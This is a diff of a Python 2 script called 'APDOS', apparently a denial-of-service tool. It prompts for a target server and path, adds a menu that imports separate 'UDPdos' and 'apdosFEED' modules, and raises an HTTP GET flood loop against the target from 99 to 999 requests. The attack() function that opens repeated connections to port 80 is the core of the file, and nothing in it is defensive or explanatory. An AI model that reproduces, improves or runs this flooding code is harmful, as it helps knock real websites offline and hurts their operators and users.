@@ -3,10 +3,20 @@ import socket, sys, os, time, itertools, threading
 print "-=-+- -+-=- -=-+- -+-=-"
 print "       - APDOS -       "
 print "-=-+- -+-=- -=-+- -+-=-"
+print "-+-=-   Version   -=-+-"
+print "-=:=-    GREAT    -=:=-"
+print "-=:=-   OKAYISH   -=:=-"
+print "-=:=-  FEEDBACKS  -=:=-"
+print "-=-+- -+-=- -=-+- -+-=-"
+version = raw_input("-+-=- ")
+if (version == 'OKAYISH'):
+	print ":D\n"
+if (version == 'okayish'):
+	print ":D\n"
 server = raw_input("SERVER: ")
 port = raw_input("PORT: ")
 type = raw_input("PAYLOAD: ")
-print "-+--=- " + server  + " -=--+-"
+print "-+--=- " + server  + " -=--+-\n"
 print "-+--=- " + type + " -=--+-"
 # -+--=- -=--+- #
 
@@ -52,10 +62,10 @@ def animate():
     for c in itertools.cycle(['|', '/', '-', '\\']):
         if done2:
             break
-        sys.stdout.write('\rTurning On       ' + c)
+        sys.stdout.write('\rActivation       ' + c)
         sys.stdout.flush()
         time.sleep(0.1)
-    sys.stdout.write('\rTurning On  [COMPLETE]\n     ')
+    sys.stdout.write('\rActivation  [COMPLETE]\n     ')
 
 t = threading.Thread(target=animate)
 t.start()
@@ -205,23 +215,44 @@ def animate1():
 
 t = threading.Thread(target=animate1)
 t.start()
-
 #long process here
 time.sleep(2)
 done4 = True
-
+if (version == 'GREAT'):
+	import UDPdos
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   - APDOS COMPLETE -   "
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	quit()
+if (version == 'great'):
+	import UDPdos
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   - APDOS COMPLETE -   "
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	quit()
+if (version == 'feedbacks'):
+	import apdosFEED
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   - APDOS COMPLETE -   "
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	quit()
+if (version == 'FEEDBACKS'):
+	import apdosFEED
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	print "   - APDOS COMPLETE -   "
+	print "-=-+- -+-=-  -=-+- -+-=-"
+	quit()
 # -+--=- -=--+- #
 def attack():  
-    #pid = os.fork()  
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
-    s.connect((server, 80))  
-    print ">> GET /" + type + " HTTP/1.1"  
-    s.send("GET /" + type + " HTTP/1.1\r\n")  
-    s.send("Host: " + server  + "\r\n\r\n");  
-    s.close()
-# 10,000 = Attack Amount
-for i in range(1, 100):
-    attack()
+	#pid = os.fork()  
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
+	s.connect((server, 80))  
+	print ">> GET /" + type + " HTTP/1.1"  
+	s.send("GET /" + type + " HTTP/1.1\r\n")  
+	s.send("Host: " + server  + "\r\n\r\n");  
+	s.close()
+for i in range(1, 1000):
+	attack()
 print "-=-+- -+-=-  -=-+- -+-=-"
 print "   - APDOS COMPLETE -   "
 print "-=-+- -+-=-  -=-+- -+-=-"
